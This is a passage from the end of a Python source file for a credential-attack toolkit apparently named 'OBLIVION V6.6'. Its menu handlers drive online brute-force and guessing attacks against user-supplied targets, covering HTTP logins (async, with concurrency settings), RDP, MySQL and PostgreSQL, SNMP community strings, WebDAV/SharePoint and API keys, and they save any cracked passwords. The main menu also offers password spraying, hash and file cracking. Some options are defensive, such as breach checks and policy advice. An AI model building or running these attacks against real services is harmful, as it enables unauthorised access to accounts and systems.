    for p in generated:
        print(p)

def menu_async_online():
    global cracking_results
    print(c("\n--- Async HTTP Brute-Force ---", C.INFO))
    if not HAS_AIOHTTP:
        print(c("aiohttp not installed.", C.ERROR)); return
    url = input("Login URL: ").strip()
    username = input("Username: ").strip()
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    success_string = input("Success indicator (optional): ").strip() or None
    concurrency = int(input("Concurrency [50]: ").strip() or 50)
    delay = float(input("Delay [0.1]: ").strip() or 0.1)
    print(c("Starting async attack...", C.INFO))
    found = asyncio.run(async_http_bruteforce(url, username, wordlist, success_string, concurrency, delay))
    if found:
        print(c(f"Password: {found}", C.SUCCESS))
        cracking_results.append({'target': url, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'async_http'})
        save_results()
    else:
        print(c("Not found.", C.ERROR))

def menu_rdp():
    global cracking_results
    print(c("\n--- RDP Brute-Force ---", C.INFO))
    host = input("Host: ").strip()
    username = input("Username: ").strip()
    port = int(input("Port [3389]: ").strip() or 3389)
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    found = rdp_bruteforce(host, username, wordlist, port)
    if found:
        print(c(f"Password: {found}", C.SUCCESS))
        cracking_results.append({'target': host, 'password': found, 'attempts': len(wordlist), 'time': 0, 'algo': 'rdp'})
        save_results()
    else:
        print(c("Not found.", C.ERROR))

def menu_database():
    global cracking_results
    print(c("\n--- Database Brute-Force ---", C.INFO))
    print("1. MySQL\n2. PostgreSQL")
    choice = input("Choice: ").strip()
    if choice not in ('1','2'): return
    host = input("Host: ").strip()
    port = int(input("Port: ").strip() or (3306 if choice=='1' else 5432))
    username = input("Username: ").strip()
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    if choice == '1':
        try:
            import pymysql
            for pwd in wordlist:
                if mysql_login(host, username, pwd, port):
                    print(c(f"Password: {pwd}", C.SUCCESS))
                    cracking_results.append({'target': host, 'password': pwd, 'attempts': len(wordlist), 'time': 0, 'algo': 'mysql'})
                    save_results()
                    return
        except ImportError:
            print(c("pymysql not installed.", C.ERROR))
    else:
        try:
            import psycopg2
            for pwd in wordlist:
                if postgres_login(host, username, pwd, port):
                    print(c(f"Password: {pwd}", C.SUCCESS))
                    cracking_results.append({'target': host, 'password': pwd, 'attempts': len(wordlist), 'time': 0, 'algo': 'postgres'})
                    save_results()
                    return
        except ImportError:
            print(c("psycopg2 not installed.", C.ERROR))
    print(c("Not found.", C.ERROR))

def menu_snmp():
    print(c("\n--- SNMP Community Guessing ---", C.INFO))
    host = input("Host: ").strip()
    communities = ["public", "private", "community", "admin", "password", "snmp"]
    for comm in communities:
        if snmp_check(host, comm):
            print(c(f"Found: {comm}", C.SUCCESS)); return
    print(c("Not found.", C.ERROR))

def menu_webdav():
    global cracking_results
    print(c("\n--- WebDAV / SharePoint ---", C.INFO))
    url = input("URL: ").strip()
    username = input("Username: ").strip()
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    for pwd in wordlist:
        if webdav_login(url, username, pwd):
            print(c(f"Password: {pwd}", C.SUCCESS))
            cracking_results.append({'target': url, 'password': pwd, 'attempts': len(wordlist), 'time': 0, 'algo': 'webdav'})
            save_results()
            return
    print(c("Not found.", C.ERROR))

def menu_api_key():
    print(c("\n--- API Key Brute-Force ---", C.INFO))
    url = input("API endpoint: ").strip()
    print("Enter keys (one per line, empty line to finish):")
    keys = []
    while True:
        line = input()
        if not line: break
        keys.append(line.strip())
    if not keys: return
    found = api_key_bruteforce(url, keys)
    if found:
        print(c(f"Valid key: {found}", C.SUCCESS))
    else:
        print(c("No valid key.", C.ERROR))

def menu_hibp():
    print(c("\n--- HaveIBeenPwned Check ---", C.INFO))
    pwd = input("Password to check: ").strip()
    if not pwd: return
    count = check_hibp(pwd)
    if count == -1:
        print(c("API error.", C.ERROR))
    elif count == 0:
        print(c("Not found in any breach.", C.SUCCESS))
    else:
        print(c(f"Found in {count} breaches!", C.RED))

def menu_policy():
    print(c("\n--- Password Policy Enforcement ---", C.INFO))
    pwd = input("Password: ").strip()
    if not pwd: return
    errors = enforce_policy(pwd)
    if errors:
        print(c("Violations:", C.WARN))
        for e in errors: print(f" - {e}")
    else:
        print(c("Meets policy.", C.SUCCESS))

def menu_remediation():
    print(c("\n--- Remediation Advice ---", C.INFO))
    pwd = input("Password: ").strip()
    if not pwd: return
    advice = suggest_stronger(pwd)
    print(c(f"Advice: {advice}", C.INFO))

def menu_plugin():
    print(c("\n--- Plugin Management ---", C.INFO))
    print(c("WARNING: Plugins execute arbitrary code. Use only trusted plugins.", C.WARN))
    print("Plugins are loaded in a restricted environment (sandbox).")
    plugins = load_plugins(safe_mode=True)
    if plugins:
        print(f"Loaded {len(plugins)} plugins:")
        for p in plugins:
            print(f" - {p.__class__.__name__ if hasattr(p, '__class__') else p.__name__}")
    else:
        print("No plugins found in ./plugins/ or failed to load.")

def menu_generate_docker():
    print(c("\n--- Generate Dockerfile & requirements.txt ---", C.INFO))
    docker = """
FROM python:3.10-slim
RUN apt-get update && apt-get install -y qpdf unrar 7zip veracrypt openssl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY oblivion.py .
ENTRYPOINT ["python", "oblivion.py"]
"""
    with open('Dockerfile', 'w') as f:
        f.write(docker.strip())
    reqs = """
bcrypt
passlib
py7zr
rarfile
pypdf
msoffcrypto-tool
gnupg
pykeepass
cryptography
requests
paramiko
aiohttp
numpy
matplotlib
flask
flask-limiter
tqdm
rich
pymysql
psycopg2-binary
pysnmp
"""
    with open('requirements.txt', 'w') as f:
        f.write(reqs.strip())
    print(c("Dockerfile and requirements.txt generated.", C.SUCCESS))

def menu_gamification():
    print(c("\n--- Gamification (CTF) ---", C.INFO))
    game = CTFGame()
    if not game.challenges:
        game.add_challenge(hashlib.sha256(b'password').hexdigest(), 'password', 'sha256')
        game.add_challenge(hashlib.md5(b'admin').hexdigest(), 'admin', 'md5')
    print("Available challenges:")
    for idx, chal in enumerate(game.challenges):
        print(f"{idx}: {chal['hash']} ({chal['algo']})")
    print("Your score:", game.get_score())
    choice = input("Enter challenge index to attempt (or 'add' to add new, 'reset' to reset score): ").strip()
    if choice.lower() == 'add':
        h = input("Hash: ").strip()
        p = input("Password: ").strip()
        algo = input("Algo [sha256]: ").strip() or 'sha256'
        salt = input("Salt (if any): ").strip() or None
        game.add_challenge(h, p, algo, salt)
        print(c("Challenge added.", C.SUCCESS))
        return
    elif choice.lower() == 'reset':
        game.score = 0
        game.cracked = []
        game.save()
        print(c("Score reset.", C.SUCCESS))
        return
    try:
        idx = int(choice)
    except:
        return
    if idx < 0 or idx >= len(game.challenges):
        print(c("Invalid index.", C.ERROR)); return
    pwd = input("Enter password guess: ").strip()
    if game.attempt(idx, pwd):
        print(c("Correct! +10 points", C.SUCCESS))
        print(f"Total score: {game.get_score()}")
    else:
        print(c("Wrong.", C.ERROR))

def menu_step_by_step():
    print(c("\n--- Step-by-Step Mode ---", C.INFO))
    target = input("Target hash: ").strip()
    if not target: return
    algo = detect_hash_algo(target)
    algo = input(f"Algo [{algo}]: ").strip() or algo
    salt = None
    if ':' in target and algo in ('sha1_salt', 'postgres'):
        salt, target = target.split(':', 1)
    wl_path = input("Wordlist path: ").strip()
    wordlist = read_wordlist(wl_path) if wl_path else ["password", "123456", "admin"]
    print(c("Step-by-step: each attempt shown with hash.", C.INFO))
    found = step_by_step_attack(target, wordlist, algo, salt)
    if found:
        print(c(f"Found: {found}", C.SUCCESS))
    else:
        print(c("Not found.", C.ERROR))

def menu_what_if():
    print(c("\n--- What-If Simulation ---", C.INFO))
    pwd = input("Enter a password: ").strip()
    if not pwd: return
    algo = input("Algorithm (sha256, bcrypt, etc.): ").strip() or 'sha256'
    salt = input("Salt (if applicable): ").strip() or None
    result = what_if_simulation(pwd, algo, salt)
    print(c(result, C.INFO))

# ---------- Main Menu ----------
def main_menu():
    print_banner()
    while True:
        if HAS_RICH:
            table = Table(title="[bold cyan]OBLIVION V6.6[/bold cyan]", box=box.HEAVY_EDGE, border_style="green")
            table.add_column("Option", style="bold yellow")
            table.add_column("Description", style="green")
            options = [
                ("1", "Generate hash"),
                ("2", "Dictionary attack (with checkpoint)"),
                ("3", "Brute-force attack"),
                ("4", "Crack password-protected file"),
                ("5", "Online brute-force (HTTP/SSH/FTP/SMTP)"),
                ("6", "Password tools (strength/generator)"),
                ("7", "Wordlist tools (profile/rules)"),
                ("8", "Hashcat integration (benchmark/run/parse)"),
                ("9", "Batch mode"),
                ("10", "Export to Hashcat/John"),
                ("11", "Session management"),
                ("12", "Reporting (full)"),
                ("13", "Password Spraying"),
                ("14", "Markov Password Generator"),
                ("15", "Async HTTP Brute-Force"),
                ("16", "RDP Brute-Force"),
                ("17", "Database Login Brute-Force"),
                ("18", "SNMP Community Guessing"),
                ("19", "WebDAV / SharePoint Brute-Force"),
                ("20", "API Key Brute-Force"),
                ("21", "HaveIBeenPwned Check"),
                ("22", "Password Policy Enforcement"),
                ("23", "Remediation Advice"),
                ("24", "Plugin Management"),
                ("25", "REST API (start/stop)"),
                ("26", "Dockerfile / requirements.txt generation"),
                ("27", "Gamification (CTF)"),
                ("28", "Step-by-Step Mode"),
                ("29", "What-If Simulation"),
                ("0", "Exit"),
            ]
            for opt, desc in options:
                table.add_row(opt, desc)
            console.print(table)
        else:
            print(c("\n" + "="*50, C.CYAN))
            print(c("   OBLIVION V6.6 – Main Menu", C.GREEN + C.BOLD))
            print(c("="*50, C.CYAN))
            print("1. Generate hash")
            print("2. Dictionary attack (with checkpoint)")
            print("3. Brute-force attack")
            print("4. Crack password-protected file")
            print("5. Online brute-force (HTTP/SSH/FTP/SMTP)")
            print("6. Password tools (strength/generator)")
            print("7. Wordlist tools (profile/rules)")
            print("8. Hashcat integration (benchmark/run/parse)")
            print("9. Batch mode")
            print("10. Export to Hashcat/John")
            print("11. Session management")
            print("12. Reporting (full)")
            print("13. Password Spraying")
            print("14. Markov Password Generator")
            print("15. Async HTTP Brute-Force")
            print("16. RDP Brute-Force")
            print("17. Database Login Brute-Force")
            print("18. SNMP Community Guessing")
            print("19. WebDAV / SharePoint Brute-Force")
            print("20. API Key Brute-Force")
            print("21. HaveIBeenPwned Check")
            print("22. Password Policy Enforcement")
            print("23. Remediation Advice")
            print("24. Plugin Management")
            print("25. REST API (start/stop)")
            print("26. Dockerfile / requirements.txt generation")
            print("27. Gamification (CTF)")
            print("28. Step-by-Step Mode")
            print("29. What-If Simulation")
            print("0. Exit")
            print(c("="*50, C.CYAN))

        choice = input(c("\nYour choice: ", C.CYAN)).strip()
        if choice == '0':
            break
        elif choice == '1': menu_generate_hash()
        elif choice == '2': menu_dictionary_attack()
        elif choice == '3': menu_bruteforce_attack()
        elif choice == '4': menu_crack_file()
        elif choice == '5': menu_online_bruteforce()
        elif choice == '6': menu_password_tools()
        elif choice == '7': menu_wordlist_tools()
        elif choice == '8': menu_hashcat_integration()
        elif choice == '9': menu_batch()
        elif choice == '10': menu_export()
        elif choice == '11': menu_session()
        elif choice == '12': menu_reporting()
        elif choice == '13': menu_password_spraying()
        elif choice == '14': menu_markov_generator()
        elif choice == '15': menu_async_online()
        elif choice == '16': menu_rdp()
        elif choice == '17': menu_database()
        elif choice == '18': menu_snmp()
        elif choice == '19': menu_webdav()
        elif choice == '20': menu_api_key()
        elif choice == '21': menu_hibp()
        elif choice == '22': menu_policy()
        elif choice == '23': menu_remediation()
        elif choice == '24': menu_plugin()
        elif choice == '25': menu_rest_api()
        elif choice == '26': menu_generate_docker()
        elif choice == '27': menu_gamification()
        elif choice == '28': menu_step_by_step()
        elif choice == '29': menu_what_if()
        else:
            print(c("Invalid option.", C.ERROR))
        input(c("\nPress Enter to continue...", C.YELLOW))
        clear_screen()
        print_banner()

# ---------- Main Entry ----------
def main():
    load_results()
    args = parse_args()
    if args.batch:
        results = run_batch(args.batch)
        print(json.dumps(results, indent=2))
        return
    if args.hash and args.wordlist:
        algo = args.algo if args.algo != 'auto' else detect_hash_algo(args.hash)
        wordlist = read_wordlist(args.wordlist) or []
        if args.bruteforce:
            found, attempts = brute_force_attack(args.hash, algo, max_len=args.max_len)
        else:
            found, attempts = dictionary_attack_parallel(args.hash, wordlist, algo, mutate=args.mutate)
        print(f"Found: {found}, Attempts: {attempts}")
        return
    if args.file:
        wordlist = read_wordlist(args.wordlist) if args.wordlist else ["password", "123456", "admin"]
        found = crack_file(args.file, wordlist, args.file_type)
        print(f"Found: {found}")
        return
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(c("\nInterrupted. Bye.", C.BRIGHT_RED))
        sys.exit(0)
